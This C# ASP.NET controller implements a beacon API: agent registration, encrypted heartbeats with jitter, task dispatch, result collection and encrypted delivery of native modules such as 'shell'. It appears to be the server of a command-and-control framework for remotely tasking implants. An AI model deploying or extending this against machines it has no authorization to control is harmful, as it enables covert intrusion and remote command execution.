using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Options;
using LibraNextgen.Common.Models;
using LibraNextgen.Common.Protocol;
using LibraNextgen.Service.Configuration;
using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/beacon")]
public class AgentCommsController : ControllerBase
{
    private static readonly string ModulesDir = Path.GetFullPath(
        Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output", "modules"));

    private readonly AgentCommsService _commsService;
    private readonly AgentTrafficService _traffic;
    private readonly ConnectionManager _wsManager;
    private readonly BeaconSettings _beaconSettings;

    public AgentCommsController(
        AgentCommsService commsService,
        AgentTrafficService traffic,
        ConnectionManager wsManager,
        IOptions<BeaconSettings> beaconSettings)
    {
        _commsService = commsService;
        _traffic = traffic;
        _wsManager = wsManager;
        _beaconSettings = beaconSettings.Value;
    }

    [HttpPost("register")]
    public async Task<IActionResult> Register([FromBody] RegisterRequest request)
    {
        if (string.IsNullOrWhiteSpace(request.Hostname))
            return BadRequest(new { error = "hostname required" });

        if (IsSecretRequired() && !IsSecretValid(request.BeaconSecret))
            return Unauthorized(new { error = "invalid beacon secret" });

        var bytesReceived = Request.ContentLength ?? 0;

        var clientIp = HttpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown";
        var agent = await _commsService.HandleRegisterAsync(request, clientIp);

        if (agent == null)
            return StatusCode(500, new { error = "registration failed" });

        // Establish AES-256 session key (RSA-OAEP encrypted with the agent's public key).
        var sessionKey = _commsService.EstablishSessionKey(agent.Id, request.PublicKey);

        var profile = _commsService.GetActiveProfile();
        var response = new
        {
            agent_id = agent.Id,
            session_key = sessionKey,
            heartbeat_url = profile.GetHeartbeatUrl("/api/beacon"),
            result_url = profile.GetResultUrl("/api/beacon"),
            ws_url = profile.GetWebSocketUrl(""),
            heartbeat_interval = profile.HeartbeatIntervalSeconds,
            jitter = profile.JitterPercent
        };

        var responseJson = JsonSerializer.Serialize(response);
        var bytesSent = Encoding.UTF8.GetByteCount(responseJson);
        _traffic.Accumulate(agent.Id, agent.Hostname, bytesReceived, bytesSent);

        // Broadcast online status to console clients
        _ = BroadcastAgentOnlineAsync(agent.Id);

        return Ok(response);
    }

    private async Task BroadcastAgentOnlineAsync(string agentId)
    {
        try
        {
            var msg = new WebSocketMessage
            {
                Type = "agent.status",
                Channel = agentId,
                Data = JsonSerializer.SerializeToElement(new { agentId, status = AgentStatus.Online.ToString() })
            };
            await _wsManager.BroadcastToConsoleAsync(msg);
        }
        catch { /* best-effort */ }
    }

    [HttpPost("heartbeat")]
    public async Task<IActionResult> Heartbeat([FromBody] JsonElement? body)
    {
        var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
        if (string.IsNullOrEmpty(agentId))
            return BadRequest(new { error = "missing agent id" });

        var bytesReceived = Request.ContentLength ?? 0;

        // Authenticate + decrypt the heartbeat payload with the session key.
        if (!_commsService.TryGetSessionKey(agentId, out var key) || key is null)
            return Unauthorized(new { error = "session not established" });

        if (body is not { } el || !el.TryGetProperty("payload", out var p) || p.GetString() is not string payload)
            return BadRequest(new { error = "missing payload" });

        string heartbeatJson;
        try
        {
            heartbeatJson = CryptoHelper.DecryptPayload(payload, key);
        }
        catch (Exception)
        {
            return Unauthorized(new { error = "decrypt failed" });
        }

        var (valid, task, hostname) = await _commsService.HandleHeartbeatAsync(agentId);
        if (!valid)
            return NotFound(new { error = "agent not found" });

        var response = new HeartbeatResponse { PendingTask = task };
        var responseJson = JsonSerializer.Serialize(response);

        // Encrypt the response with the session key.
        var encryptedResponse = CryptoHelper.EncryptPayload(responseJson, key);
        var bytesSent = Encoding.UTF8.GetByteCount(encryptedResponse);

        _commsService.RecordTraffic(agentId, hostname, bytesReceived, bytesSent);

        return Ok(new { payload = encryptedResponse });
    }

    [HttpPost("result")]
    public async Task<IActionResult> SubmitResult([FromBody] JsonElement? body)
    {
        var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
        if (string.IsNullOrEmpty(agentId))
            return BadRequest(new { error = "missing agent id" });

        var bytesReceived = Request.ContentLength ?? 0;

        if (!_commsService.TryGetSessionKey(agentId, out var key) || key is null)
            return Unauthorized(new { error = "session not established" });

        if (body is not { } el || !el.TryGetProperty("payload", out var p) || p.GetString() is not string payload)
            return BadRequest(new { error = "missing payload" });

        TaskResult? result;
        try
        {
            var plain = CryptoHelper.DecryptPayload(payload, key);
            result = JsonSerializer.Deserialize<TaskResult>(plain);
        }
        catch (Exception)
        {
            return Unauthorized(new { error = "decrypt failed" });
        }

        if (result is null)
            return BadRequest(new { error = "invalid payload" });

        var responseJson = JsonSerializer.Serialize(new { status = "received" });
        var bytesSent = Encoding.UTF8.GetByteCount(responseJson);
        var success = await _commsService.HandleResultAsync(agentId, result, bytesReceived, bytesSent);
        if (!success)
            return NotFound(new { error = "invalid task" });

        return Ok(new { status = "received" });
    }

    /// <summary>
    /// Serve a cloud module (e.g. "shell") to an authenticated agent. The module
    /// binary is encrypted with the agent's session key on the fly.
    /// </summary>
    [HttpGet("module/{name}")]
    public IActionResult DownloadModule(string name)
    {
        var agentId = Request.Headers["X-Agent-Id"].FirstOrDefault();
        if (string.IsNullOrEmpty(agentId))
            return BadRequest(new { error = "missing agent id" });

        if (!_commsService.TryGetSessionKey(agentId, out var key) || key is null)
            return Unauthorized(new { error = "session not established" });

        if (string.IsNullOrEmpty(name) || name.Any(c => !(char.IsAsciiLetterOrDigit(c) || c == '-' || c == '_')))
            return BadRequest(new { error = "invalid module name" });

        var ext = OperatingSystem.IsWindows() ? "dll" : OperatingSystem.IsMacOS() ? "dylib" : "so";
        var modulePath = Path.Combine(ModulesDir, $"{name}.{ext}");
        if (!System.IO.File.Exists(modulePath))
            return NotFound(new { error = "module not found" });

        var bytes = System.IO.File.ReadAllBytes(modulePath);
        var payload = CryptoHelper.EncryptBytes(bytes, key);
        return Ok(new { payload });
    }

    private bool IsSecretRequired() => !string.IsNullOrWhiteSpace(_beaconSettings.Secret);

    private bool IsSecretValid(string? provided) =>
        string.Equals(provided, _beaconSettings.Secret, StringComparison.Ordinal);
}
